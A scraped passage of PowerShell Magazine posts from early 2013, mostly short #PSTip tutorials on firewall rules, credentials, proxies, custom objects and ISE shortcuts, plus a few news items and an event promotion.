2012"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nIn an earlier tip, we looked at how we can add firewall rules in Windows 8 or Windows Server 2012. In today’s tip, we shall look at how we can get the firewall rules from local and remote systems in Windows 8 and Windows Server 2012 systems.\nWe can use the Get-NetFirewallRule cmdlet to achieve this. First, let us see how we can use this cmdlet on the local system.\nGet-NetFirewallRule -All  The above command will list all available Firewall rules irrespective of their state (enabled or disabled) or action (allowed or denied). To filter this further to only enabled firewall rules, we can run:\nGet-NetFirewallRule -Enabled True  We can filter this further and retrieve only the rules that are enabled and are set to allow.\nGet-NetFirewallRule -Enabled True -Action Allow  So, how do we use this to retrieve the rules from a remote system? Simple, we need to use a computer name string or a CIM session object as an argument to the -CimSession parameter of Get-NetFirewallRule cmdlet.\n$cimSession = New-CimSession -ComputerName Server-03 Get-NetFirewallRule -CimSession $cimSession -Enabled True -Action Allow  Or\nGet-NetFirewallRule -CimSession Server-03 -Enabled True -Action Allow  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/20/pstip-get-windows-firewall-rule-status-in-windows-8-and-server-2012/","tags":["Tips and Tricks"],"title":"#PSTip Get Windows Firewall rule status in Windows 8 and Server 2012"},{"categories":["News"],"contents":"We are happy to announce that PowerShell Magazine is a media partner for TechMentor, Orlando.\nAbout TechMentor: Surrounded by your fellow IT professionals, TechMentor provides you with immediately usable IT education that will keep you relevant in the workforce.\nCheck out the dedicated track for Windows PowerShell and Automation.\nObviously there are a ton of other great sessions aimed at helping you solve the real-world IT challenges you are facing today. Plus, TechMentor is a great opportunity to meet your favorite tech experts like Don Jones, Greg Shields, and Mark Minasi . I know I always look forward to meeting fellow IT pros and chatting about what projects they’re working on or current issues they’re facing.\nSPECIAL OFFER: As a PowerShell Magazine reader, you get a $400 discount on the 5-day package. Register here: http://bit.ly/TMFG4Reg and use code TMFG4.\nLearn how you can build a more productive IT environment at TechMentor Orlando — bring the IT issues that keep you up at night and prepare to leave this event with the answers, guidance, and training you need. Register now: http://bit.ly/TMFG4Reg\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/20/powershell-magazine-is-a-silver-media-partner-for-techmentor-orlando/","tags":["News"],"title":"PowerShell Magazine is a media partner for TechMentor, Orlando"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nBefore the release of Windows Server 2012 and Windows 8, adding rules to Windows Firewall required a painful approach of using the firewall COM object.\nIn Windows Server 2012 and Windows 8 operating systems, there is a new cmdlet called New-NetFirewallRule. This cmdlet provides a way to add new firewall rules.\nThe following example shows how to use this cmdlet to enable inbound traffic to port 80 on the local system.\nNew-NetFirewallRule -DisplayName \"Allow Port 80\" -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/19/pstip-adding-firewall-rules-in-windows-8-and-server-2012/","tags":["Tips and Tricks"],"title":"#PSTip Adding Firewall rules in Windows 8 and Server 2012"},{"categories":["Tips and Tricks"],"contents":"Let’s say you created a new TimeSpan object by using the Start parameter.\nPS\u0026gt; $ts = New-TimeSpan -Start 1/1/2014 PS\u0026gt; $ts Days : -324 Hours : -9 Minutes : -44 Seconds : -12 Milliseconds : -596 Ticks : -280286525960331 TotalDays : -324.405701342976 TotalHours : -7785.73683223142 TotalMinutes : -467144.209933885 TotalSeconds : -28028652.5960331 TotalMilliseconds : -28028652596.0331 You ended up with an object whose value is negative because the start date is greater than the end date. PowerShell assigns the current date to the End parameter if no value has been specified. So, what do you do if you need a positive value? If you send the object to the Get-Member cmdlet you’ll notice a method called Negate.\nPS\u0026gt; $ts | Get-Member -MemberType Method TypeName: System.TimeSpan Name MemberType Definition ---- ---------- ---------- Add Method timespan Add(timespan ts) CompareTo Method int CompareTo(System.Object value), int CompareTo(timespan value), int IComparable.CompareTo(... Duration Method timespan Duration() Equals Method bool Equals(System.Object value), bool Equals(timespan obj), bool IEquatable[timespan].Equals... GetHashCode Method int GetHashCode() GetType Method type GetType() Negate Method timespan Negate() Subtract Method timespan Subtract(timespan ts) ToString Method string ToString(), string ToString(string format), string ToString(string format, System.IFor... All you need to do is invoke it.\nPS\u0026gt; $ts.Negate() Days : 324 Hours : 9 Minutes : 44 Seconds : 12 Milliseconds : 596 Ticks : 280286525960331 TotalDays : 324.405701342976 TotalHours : 7785.73683223142 TotalMinutes : 467144.209933885 TotalSeconds : 28028652.5960331 TotalMilliseconds : 28028652596.0331 Likewise, invoking the method on a positive object gives you back a negative instance.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/18/pstip-handling-negative-timespan-objects/","tags":["Tips and Tricks"],"title":"#PSTip Handling negative TimeSpan objects"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nThere are times when you need to validate the credentials of an Active Directory user account. A typical scenario is when you have a service object that no one remembers its credentials and you don’t want to reset it before you make sure you tried all the passwords the object may has.\nOne option would be to try and log on to the server using those credentials. However, you can’t use that if you want to automate the process. In this case you’d want to check the PrincipalContext.ValidateCredentials method.\nThe ValidateCredentials method returns a Boolean value that specifies whether the specified username and password are valid. To use that method we first need to load the System.DirectoryServices.AccountManagement assembly (part of .NET 3.5). We create a ContextType object, pass it together with the user domain name to the PrincipalContext object, and then invoke the method.\nAdd-Type -AssemblyName System.DirectoryServices.AccountManagement $UserName=$env:USERNAME $Password='P@ssword' $Domain = $env:USERDOMAIN $ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain $pc = New-Object System.DirectoryServices.AccountManagement.PrincipalContext $ct,$Domain $pc.ValidateCredentials($UserName,$Password) ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/15/pstip-validating-active-directory-user-credentials/","tags":["Tips and Tricks"],"title":"#PSTip Validating Active Directory user credentials"},{"categories":["News"],"contents":"Few days ago the new version (0.6.10) of the Windows Azure PowerShell has been released. The Windows Azure PowerShell provides IT Pros and developers with Windows PowerShell cmdlets for building, deploying, and managing Windows Azure services.\nIf you prefer Web Platform Installer, you can get the new version from Windows Azure Downloads page. For those among you who like direct access to .msi file, there is a link on the Windows Azure SDK Tools GitHub page.\nHere is the official change log for version 0.6.10 :\n Upgrade to use PowerShell 3.0 Released source code for VM and Cloud Services cmdlets Added a few new cmdlets for cloud service scaffolding Added Support for SAS in destination Uri for Add-AzureVhd Added -Confirm and -WhatIf support for Remove-Azure* cmdlets Added configurable startup task for Node.js and generic roles Enabled emulator support when running roles with memcache Role-based cmdlets don’t require role name if run in a role folder Added scenario test framework and started adding automated scenario tests Multiple bug fixes  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/15/new-version-of-the-windows-azure-powershell/","tags":["News"],"title":"New version of the Windows Azure PowerShell"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nAs system administrators, when troubleshooting an issue, we are often required to take a look at a certain knowledge base article from Microsoft. The base URL for KB articles always start with _http://support.microsoft.com/kb/_ followed by a KB id number, such as: _http://support.microsoft.com/kb/968930_.\nNow, between us, will you remember that URL while working on an important issue? You’ll probably (like I do) launch your browser and rely on its address completion or use a search engine to locate it.\nInstead, why not automating it with a simple one-liner function? Give it a try.\nfunction kb($id) { Start-Process \u0026quot;http://support.microsoft.com/kb/$id\u0026quot; } PS\u0026gt; kb 968930 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/14/pstip-quickly-load-microsoft-kb-articles/","tags":["Tips and Tricks"],"title":"#PSTip Quickly load Microsoft KB articles"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nPowerShell background jobs are very powerful way to achieve parallelism when performing administrative tasks. When we use background jobs, the results from the tasks in the background job remain in the background runspace. We need to use the Receive-Job cmdlet to be able to see the results or output from the background jobs. But, what if we want to see the results as they get generated?\nLet us consider a hypothetical example:\n$jobs = \"vm1\",\"vm2\",\"vm3\" | foreach { Start-Job -ScriptBlock { New-VM -Name $using:_ -Verbose } }  The above example creates three Hyper-V virtual machines using background jobs so that we speed up the VM creation process. Now, how can we stream the results as the VMs are created?\nHere is a simple method:\nwhile ($jobs.HasMoreData -and $jobs.State -eq \"Running\") { Receive-Job -Job $jobs }  If you run the above two snippets together, you should see something similar to what is shown below:\nThe order of these messages is certainly not guaranteed because of the nature of background jobs and parallelism. By default, the results received will be deleted from the background runspace unless we specify the -Keep parameter. If you prefer to use the results apart from just streaming them, you may want to consider using the -Keep parameter.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/13/pstip-streaming-results-from-background-jobs-in-powershell-3-0/","tags":["Tips and Tricks"],"title":"#PSTip Streaming results from background jobs in PowerShell 3.0"},{"categories":["Tips and Tricks"],"contents":"Sometimes you need to prompt a user for input so you can base your script upon it. The Read-Host cmdlet is made just for that.\nPS\u0026gt; $result = Read-Host 'Enter a number between 1 and 5' Enter a number between 1 and 5: 3 PS\u0026gt; $result 3 What if the user entered something you didn’t expect? Your script fails to execute it. For example, the user supplied a higher or a lower number or even a non-digit character.\nWith the following loop, a do-while loop, you can force the user to enter a valid number. A prompt will appear as long as the result doesn’t meet your criteria.\ndo{ $result = Read-Host 'Enter a number between 1 and 5' } while(1..5 -notcontains $result) Enter a number between 1 and 5: 0 Enter a number between 1 and 5: 6 Enter a number between 1 and 5: a Enter a number between 1 and 5: 3 PS\u0026gt; $result 3 As you can see all three attempts to assign a non valid value resulted in a re-prompt. It will continue to execute until the user enters a value your script is expecting to work with.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/12/pstip-prompt-until-satisfied/","tags":["Tips and Tricks"],"title":"#PSTip Prompt until satisfied"},{"categories":["News","PowerCLI"],"contents":"PowerCLI 5.1 Release 2 has now been released and can be downloaded here. Other than bug fixes and new enhancements, the new release supports PowerShell 3.0. In addition, it ships with a new snap-in, VMware.VimAutomation.VDS, which contains a set of 14 cmdlets for managing Virtual Distributed Switches, and also adds support for automating the latest version of vCloud director.\nYou can read more about the new version here.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/12/powercli-5-1-release-2-is-released/","tags":["PowerCLI","News"],"title":"PowerCLI 5.1 Release 2 is released"},{"categories":["Tips and Tricks"],"contents":"PowerShell’s Get-Credential cmdlet lets us create a secure credential object for a specified user name and password using a UI dialog:\nPS\u0026gt; Get-Credential shay  There’s a way of replacing the UI and collect the credentials via the command line. You need to be an administrator to do that and the console must be elevated (e.g “Run as Admin”).\nThe change involves adding a registry value to the HKLM hive:\n$key = \"HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\1\\ShellIds\" Set-ItemProperty -Path $key -Name ConsolePrompting -Value $true  You add the ConsolePrompting value to the above path and set its data to $true. From now on, all Get-Credential calls will look like this:\nPS\u0026gt; Get-Credential shay Windows PowerShell Credential Request Enter your credentials. Password for user shay: ******** To bring back the UI dialog, set the value to $false or remove it all altogether. Note that this trick doesn’t have any effect in the ISE.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/11/pstip-get-credential-at-the-command-line/","tags":["Tips and Tricks"],"title":"#PSTip Get-Credential at the command line"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nRecently, on Windows Server 2012, I was trying to determine, both locally and remotely, if a user belongs to a specific group. For example, when I am running Hyper-V automation scripts, I need to determine if the currently logged-in user is part of Hyper-V administrators group or not.\nIn PowerShell 3.0, we can use CIM cmlets and associations to find this easily.\nGet-CimInstance -Filter \u0026quot;Name='Jeff'\u0026quot; -ClassName Win32_UserAccount | Get-CimAssociatedInstance -Association Win32_GroupUser | Select-Object Name Simple!\nNow, to find the group memberships of the locally logged-in user on a remote machine, we just need to run:\nGet-CimInstance -ClassName Win32_UserAccount -Filter \u0026quot;Name='$env:UserName'\u0026quot; -ComputerName Server-01 | Get-CimAssociatedInstance -Association Win32_GroupUser | Select-Object Name ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/08/pstip-using-cim-cmdlets-to-find-the-user-group-membership/","tags":["Tips and Tricks"],"title":"#PSTip Using CIM cmdlets to find the user group membership"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nWhen you assign the output of a command to a variable, you can’t know in advance how many objects are in the variable. It may contain one object (scalar) or an array (collection) of objects. In versions prior to PowerShell 3.0, if you treat a variable as a collection of objects and try to get the first item when the variable contains a single object, you’ll get the following error:\nPS\u0026gt; $foo = 1 PS\u0026gt; $foo[0] Unable to index into an object of type System.Int32. In PowerShell 2.0, the workaround used to avoid that error was to force the result to an array:\nPS\u0026gt; [array]$foo=1 PS\u0026gt; $foo[0] 1  In PowerShell 3.0, we can now index into scalars without the need to tweak the object:\nPS\u0026gt; $foo[0] 1   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/07/pstip-index-into-scalar-in-powershell-3-0/","tags":["Tips and Tricks"],"title":"#PSTip Index into scalar in PowerShell 3.0"},{"categories":["News"],"contents":"Microsoft has recently published a learning roadmap to understand Windows PowerShell for SharePoint 2013. Microsoft SharePoint 2013, as many other updated Microsoft products, has an increased number of cmdlets to perform SharePoint management tasks.\nFrom the article:\n If you are new to Windows PowerShell in SharePoint 2013, this article can help you identify what you need to learn to understand how to build expertise for Windows PowerShell in SharePoint 2013. It includes prerequisite articles that explain Windows PowerShell fundamentals. You have to understand the prerequisite technologies first. Windows PowerShell in SharePoint 2013 assumes that you understand basic concepts. Afterwards, you can start to learn about Windows PowerShell in SharePoint 2013 with the resources in the Level 100 (introductory), 200 (intermediate), and 300 (advanced) sections.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/07/windows-powershell-for-sharepoint-2013-a-learning-roadmap/","tags":["News"],"title":"Windows PowerShell for SharePoint 2013 – A learning roadmap"},{"categories":["Tips and Tricks"],"contents":"I write scripts that include downloading content from the Internet. Now, I want these scripts to work even when I am behind a proxy server. There is a simple way in .NET to check if we are behind a proxy. For this purpose, we will use System.Net.WebClient .NET class.\nFunction Test-Proxy { $wc = New-Object System.Net.WebClient $wc.Proxy.IsBypassed(\"http://www.microsoft.com\") }  The Test-Proxy function returns False if you are behind a proxy server.\nNote: The following example works only on PowerShell 3.0 and above.\nI use this effectively along with the $PSDefaultParameterValues in PowerShell 3.0. For example, in a script to download content from Internet, I will have to set proxy credentials for the Start-BitsTransfer cmdlet. This is how I do it:\nif (-not (Test-Proxy)) { if (-not ($PSDefaultParameterValues.ContainsKey(\"Start-BitsTransfer:ProxyAuthentication\")) -and ($PSDefaultParameterValues.ContainsKey(\"Start-BitsTransfer:ProxyAuthentication\"))) { $cred = Get-Credential -Message \"Enter Proxy authentication credentials\" -UserName \"${env:USERDOMAIN}\\${env:UserName}\" $PSDefaultParameterValues.Add(\"Start-BitsTransfer:ProxyAuthentication\",\"Basic\") $PSDefaultParameterValues.Add(\"Start-BitsTransfer:ProxyCredential\",$cred) } }  If we place the above code snippet at the beginning of the script, it first checks if proxy authentication is required for Internet access and sets the default parameter values for Start-BitsTransfer cmdlet.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/06/pstip-validate-if-proxy-credentials-are-required/","tags":["Tips and Tricks"],"title":"#PSTip Validate if proxy credentials are required"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nWhen writing commands in PowerShell you can be as formal as:\nGet-ChildItem -Include*.txt -Recurse  Or you can be as terse as:\ngci -i *.txt -r  As you can see you use aliases (gci) instead of writing the full command name and you can also use partial names of parameters (i,r). Shortened parameter names are allowed as long as you have specified enough of the parameter name to make it unique.\nFor example, what would happen if we specify -f to Get-ChildItem:\nPS\u0026gt; gci -f *.txt Get-ChildItem : Parameter cannot be processed because the parameter name 'f' is ambiguous. Possible matches include: -Filter -Force. As you can see, specifying just ‘f’ is not enough as it yields two matches, so the parameter binder can’t decide which one to use. To disambiguate it we need to add more characters; in this case ‘fi’ would suffice.\nIn PowerShell 3.0 we can also use the same technique to shorten parameter arguments. This works as long as the parameter type is an Enum object. So, instead of writing:\nPS\u0026gt; Write-Host hello -ForegroundColor Yellow  We can now do:\nPS\u0026gt; Write-Host hello -ForegroundColor y  If you try to use ‘b’ for example, you’ll get an error that says it all:\nPS\u0026gt; Write-Host hello -ForegroundColor b Write-Host : Cannot bind parameter 'ForegroundColor'. Cannot convert value \"b\" to type \"System.ConsoleColor\". Error: \"The identifier name b cannot be processed due to the inability to differentiate between the following enumerator names: Black, Blue. Try a more specific identifier name.\"   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/05/pstip-argument-disambiguation-in-powershell-3-0/","tags":["Tips and Tricks"],"title":"#PSTip Argument disambiguation in PowerShell 3.0"},{"categories":["Tips and Tricks"],"contents":"They say that PowerShell is the ultimate tool that provides almost infinite number of possible applications. So I wondered: What should I do to actually express infinity in PowerShell? The answer turned out to be fairly simple; the System.Double class implements static properties that represent both positive and negative infinity.\nPS\u0026gt; [System.Double]::PositiveInfinity Infinity PS\u0026amp;gt; [System.Double]::NegativeInfinity -Infinity The infinity number is defined as the result of division by zero, and we can, of course, confirm this definition:\nPS\u0026gt; [Double]1/0 Infinity  You probably won’t use these ‘values’ often, but you should know they can be used similarly to any other number. You can for example test if the estimated number of all atoms in the observable Universe is less than infinite:\nPS\u0026gt; 10e80 –lt [System.Double]::PositiveInfinity True   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/04/pstip-to-infinity-and-beyond/","tags":["Tips and Tricks"],"title":"#PSTip To infinity and beyond!"},{"categories":["How To"],"contents":"Creating PowerShell custom objects is a common task that some find hard to do right. In this article I’ll show a sample code that has some of the common flaws. We will go through the code, describe what is wrong, and I’ll show one way to correct it. Then I will add a few more ways to create custom objects. The example code is as follows:\n$groups = 'Group1', 'Group2' $users = 'User1', 'User2' $objectCollection=@() $object = New-Object PSObject Add-Member -InputObject $object -MemberType NoteProperty -Name Group -Value \u0026quot;\u0026quot; Add-Member -InputObject $object -MemberType NoteProperty -Name User -Value \u0026quot;\u0026quot; $groups | ForEach-Object { $groupCurrent = $_ $users | ForEach-Object { $userCurrent = $_ $object.Group = $groupCurrent $object.User = $userCurrent $objectCollection += $object } } $objectCollection The code above creates custom objects with two properties: Group and User. The properties are filled with data from the $groups variable and the $users variable. Combining two and two items we get four objects in total. This is the output we expect:\nGroup User ----- ---- Group1 User1 Group1 User2 Group2 User1 Group2 User2  Implementing this we first create the data to work on and the object using the New-Object cmdlet. This object will be used as a template so we also add empty properties using the Add-Member. Then we use two loops, one placed into the other. The first for each loop iterates over the values in the $groups variable and the second iterates over the values in the $users variable; this enables us to easily combine the values. In both loops we save the item we are currently working with to appropriately named variable, $groupCurrent or $userCurrent. In the inner loop we use these variables to set the properties of our template object to correct values, we also add the object to the $objectCollection there.\nAfter processing all items we output the $objectCollection array and get this result:\nGroup User ----- ---- Group2 User2 Group2 User2 Group2 User2 Group2 User2  The code does not work as expected. The property values are the same for all four objects.\nThe problem is that we create the object ‘before’ we enter the foreach loop. We assign the information to the object and add it to the collection, but we still use the same object. When we added it to the collection we added just a ‘reference’ to the object, not the object itself. What we ended up with was just four ‘shortcuts’ to the same object. To fix that we need to create new object each time in the second ForEach loop, as in:\n$groups = 'Group1', 'Group2' $users = 'User1', 'User2' $objectCollection=@() $groups | ForEach-Object { $groupCurrent = $_ $users | ForEach-Object { $userCurrent = $_ $object = New-Object PSObject Add-Member -InputObject $object -MemberType NoteProperty -Name Group -Value \u0026quot;\u0026quot; Add-Member -InputObject $object -MemberType NoteProperty -Name User -Value \u0026quot;\u0026quot; $object.Group = $groupCurrent $object.User = $userCurrent $objectCollection += $object } } $objectCollection The script is fixed and works as expected but there are still few things we can do easier. First, creating the array and saving the objects manually is not necessary, we can just assign the output to a variable and PowerShell will create the collection automatically. Second we can use the ‘Property’ parameter of the New-Object to create the properties easier. In the end the code may look as such:\n$groups = 'Group1', 'Group2' $users = 'User1', 'User2' $objectCollection = $groups | ForEach-Object { $groupCurrent = $_ $users | ForEach-Object { $userCurrent = $_ $properties = @{ User=$userCurrent; Group = $groupCurrent } New-Object -TypeName PSObject -Property $properties } } $objectCollection This way of creating custom objects is great when you create the object in just one place, and if the object has just few properties.\nSometimes you need to create an object that has properties set to default values and use it as template. In situations like this you can use the Copy() method of PSObject. Let’s rewrite our sample code to reflect this need, and add one property called ‘dummy’ that we set to default value:\n$groups = 'Group1', 'Group2' $users = 'User1', 'User2' $properties = @{User=''; Group = ''; Dummy = 'Default'} $objectTemplate = New-Object -TypeName PSObject -Property $properties $objectCollection = $groups | ForEach-Object { $groupCurrent = $_ $users | ForEach-Object { $userCurrent = $_ $objectCurrent = $objectTemplate.PSObject.Copy() $objectCurrent.group = $groupCurrent $objectCurrent.user = $userCurrent $objectCurrent } } $objectCollection | ft –AutoSize Group User Dummy ----- ---- ----- Group1 User1 Default Group1 User2 Default Group2 User1 Default Group2 User2 Default As in the first example, we created the object before entering the foreach loops, but this time we saved it in the $objectTemplate variable and more importantly we used a copy of the template object in the loops. This time it works because we don’t use just the reference to the object but we create a new copy of the object in the inner foreach loop.\nThis approach is great but after you use the $objectTemplate for the last time you should use its Dispose() method to free the memory allocated, and also you must not forget to initialize the object before the first use. Sure the amount of allocated memory is pretty insignificant, and you can set the object defaults as the first thing in the script, but why complicating it? Create a new helper function called ‘New-ReportLine’ that takes ‘User’, ‘Group’ and ‘Dummy’ parameters and outputs the new object. See the next example:\nFunction New-ReportLine ($Group='GroupDefault',$User='UserDefault',$Dummy='Default' ) { New-Object -TypeName psObject -Property @{Group = $group; User=$user; Dummy= $Dummy} } $groups = 'Group1', 'Group2' $users = 'User1', 'User2' $objectCollection = $groups | ForEach-Object { $groupCurrent = $_ $users | ForEach-Object { $userCurrent = $_ New-ReportLine -Group $groupCurrent -User $userCurrent } } $objectCollection Group User Dummy ----- ---- ----- Group1 User1 Default Group1 User2 Default Group2 User1 Default Group2 User2 Default Here we basically took the same approach as in the third example (we are creating the object in the inner foreach loop), but this time we use the default parameter values and the scoping of the function. That approach enables us to get rid of the need to call Dispose() and still we have the ability to set the properties to default values.\nTo show you another example where the pros of this approach really shows up see the next example:\nfunction IsServerRemotable ($Name) {$name -eq 'localhost'} function IsServerOnline ($Name) {$name -eq 'localhost'} Function New-ReportLine ($Server,[switch]$isOnline,[switch]$isRemotable) { New-Object -TypeName psObject -Property @{Server=$Server; isOnline=$isOnline; isRemotable=$isRemotable} } $servers = 'localhost', 'nonexistent' $report = $servers | ForEach-Object { if (IsServerOnline -Name $_) { if (IsServerRemotable -Name $_) { #server is both online and remotable New-ReportLine -Server $_ -isOnline -isRemotable } else { #server is just online New-ReportLine -Server $_ -isOnline } } else { #server is not online New-ReportLine -Server $_ } } $report Server isOnline isRemotable ------ -------- ----------- localhost True True nonexistent False False The function New-ReportLine creates a new object when invoked. The Server parameter accepts the name of the server. The isOnline and the isRemotable parameters default to False as switch parameters always do when they are not present in the function call. In the script body we pipe the items from the $servers to the foreach loop and test if the server is online. If the server is online we test if the server is accessible by PowerShell remoting. If the server is accessible by PowerShell remoting appropriate object is returned. In other cases we also call the ‘constructor’ function using appropriate set of parameters.\nBoth IsServerOnline and IsServerRemotable are just pseudo functions to make the examples work of the shelf.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/04/creating-powershell-custom-objects/","tags":["How To"],"title":"Creating PowerShell custom objects"},{"categories":["Tips and Tricks"],"contents":"Modifying a file always brings a risk of corrupting it; making a backup copy whenever possible is one of the file manipulation best-practices. One way of doing it is to create a copy with the same name and appropriate extension like ‘bak’. This task can be finished in a few different ways. Here is my favorite–using the Copy-Item cmdlet and the ChangeExtension() method of the System.IO.Path class:\n$path = 'C:\\temp\\ImportantFile.txt' Copy-Item -Path $path –Destination ([io.path]::ChangeExtension($path, '.bak')) -Verbose   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/02/01/pstip-one-way-to-change-a-file-extension/","tags":["Tips and Tricks"],"title":"#PSTip One way to change a file extension"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 3.0 or above.\nIn an earlier tip, we looked at how we can retrieve the redirected URL using a .NET class. In today’s tip, we will look at how we can simplify that process using an in-built PowerShell 3.0 cmdlet – Invoke-WebRequest.\n$uri = 'http://go.microsoft.com/fwlink/?LinkID=210601' $request = Invoke-WebRequest -Uri $uri -MaximumRedirection 0 -ErrorAction Ignore if($request.StatusDescription -eq 'found') { $request.Headers.Location } This is it. Much simpler than the earlier approach!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/31/pstip-retrieve-a-redirected-url-powershell-3-0-way/","tags":["Tips and Tricks"],"title":"#PSTip Retrieve a redirected URL – PowerShell 3.0 way!"},{"categories":["Tips and Tricks"],"contents":"When you look at online documentation for resources and downloadable content, you will often find URLs that redirect you to another place. Most of the web masters prefer this way because the front end redirection URL can be redirected to a right location when there are updates to the content.\nThere are quite a few examples. To quote a couple of them:\n  SharePoint Server prerequisite software download links. We cannot use these URLs directly with cmdlets such as Start-BitsTransfer. We need to find the right redirected URL for the actual file download.\n  PowerShell 3.0 help content links\n  Get-Module -Name Microsoft.PowerShell.Management | select -exp HelpInfoUri  Now, taking the second example as a use case, let us see how we can retrieve the redirected URL. We can use the System.Net.WebRequest .NET class to achieve this.\nFunction Get-RedirectedUrl { Param ( [Parameter(Mandatory=$true)] [String]$URL ) $request = [System.Net.WebRequest]::Create($url) $request.AllowAutoRedirect=$false $response=$request.GetResponse() If ($response.StatusCode -eq \u0026quot;Found\u0026quot;) { $response.GetResponseHeader(\u0026quot;Location\u0026quot;) } }  In the above function, we are setting $request.AllowAutoRedirect to $false to ensure that we don’t necessarily reach the redirected URL. Our goal is to find the redirection and not really access the redirected URL. Once we set this property, if the given URL redirects to a new location, the “location” header contains the redirected URL.\nPS C:\\\u0026gt; Get-RedirectedUrl -URL 'http://go.microsoft.com/fwlink/?LinkID=210601' http://download.microsoft.com/download/3/4/C/34C6B4B6-63FC-46BE-9073-FC75EAD5A136/  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/01/29/pstip-retrieve-a-redirected-url/","tags":["Tips and Tricks"],"title":"#PSTip Retrieve a redirected URL"},{"categories":["How To","Tips and Tricks"],"contents":"In a previous tip I showed a new hidden keyboard shortcut to transpose lines of code in the ISE. At the PowerShell Facebook group, Dave Carnahan was wondering if there’s a way to pull all of the ISE related hot keys.\nDave, this is for you. 🙂\nAll shortcuts are contained in the ISE Microsoft.PowerShell.GPowerShell assembly (DLL). We first need to get a reference to that DLL.\nPS\u0026gt; $gps = $psISE.GetType().Assembly PS\u0026gt; $gps GAC Version Location --- ------- -------- True v4.0.30319 C:\\Windows\\Microsoft.Net\\assembly\\GAC_MSIL\\Microsoft.PowerShell.GPowerShell\\... Then we can get a list of all the resources in this assembly:\nPS\u0026gt; $gps.GetManifestResourceNames() Microsoft.PowerShell.GPowerShell.g.resources GuiStrings.resources Next we create a ResourceManager object which provides access to the assembly resources. We pass it the name of the resource we want to access without the .resources extension, and the assembly containing the resources.\n$rm = New-Object System.Resources.ResourceManager GuiStrings,$gps  All that’s left is calling the GetResourceSet() method to retrieve the resource set for a particular culture.\n$rs = $rm.GetResourceSet((Get-Culture),$true,$true) $rs Name Value ---- ----- SnippetToolTipPath Path: {0} MediumSlateBlueColorName Medium Slate Blue EditorBoxSelectLineDownShor... Alt+Shift+Down NewRunspace N_ew PowerShell Tab EditorSelectToPreviousChara... Shift+Left RemoveAllBreakpointsShortcut Ctrl+Shift+F9 SaveScriptQuestion Save {0}? (...) Looking at the output we can see that the highlighted items value resembles key combinations. If you look at your output you will notice items with a name that ends with ‘Shortcut’ (with or without a trailing digit) and items that relates to Function keys. They start with F, followed by a digit or two and the word ‘Keyboard’. With the following line we can filter all keyboard related items and sort them out.\n$rs | where Name -match 'Shortcut\\d?$|^F\\d+Keyboard' | Sort-Object Value  Here’s the full code snippet and the full result, start digging 😉\n UPDATE: Thanks to June Blender Rogers for reporting this. It looks like the list was missing one shortcut: Go to match – Ctrl+]. It doesn\u0026rsquo;t appear in the list and it’s likely hard-coded in the menu item. PowerShell scripts are full with brace/bracket/parenthesis characters and sometimes you may find it hard to locate the closing or opening bracket. In these cases, the ‘Go to match’ keyboard shortcut comes very handy. Just place the cursor in front of a bracket and press the shortcut key combination; you\u0026rsquo;ll see it jumping to the matching one and highlighting it.\n $gps = $psISE.GetType().Assembly $rm = New-Object System.Resources.ResourceManager GuiStrings,$gps $rs = $rm.GetResourceSet((Get-Culture),$true,$true) $rs | where Name -match 'Shortcut\\d?$|^F\\d+Keyboard' | Sort-Object Value | Format-Table -AutoSize Name Value ---- ----- EditorUndoShortcut2 Alt+Backspace EditorSelectNextSiblingShortcut Alt+Down ExitShortcut Alt+F4 EditorSelectEnclosingShortcut Alt+Left EditorSelectFirstChildShortcut Alt+Right EditorRedoShortcut2 Alt+Shift+Backspace EditorBoxSelectLineDownShortcut Alt+Shift+Down ToggleHorizontalAddOnPaneShortcut Alt+Shift+H EditorBoxSelectToPreviousCharacterShortcut Alt+Shift+Left 